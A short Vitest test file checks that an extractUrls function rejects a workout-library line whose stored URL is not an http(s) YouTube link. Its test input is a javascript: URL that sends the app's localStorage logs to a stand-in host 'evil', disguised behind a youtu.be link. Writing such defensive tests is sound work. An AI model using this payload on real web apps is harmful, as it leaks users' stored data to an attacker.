import { describe, expect, it } from 'vitest';
import { extractUrls } from './LibraryView';

describe('extractUrls', () => {
  it('rejects pipe-delimited lines whose stored URL is not an http(s) YouTube URL', () => {
    expect(
      extractUrls("Bench Press | javascript:fetch('https://evil/?d='+localStorage.th_logs)//https://youtu.be/abcDEF123_4")
    ).toEqual([]);
  });
});
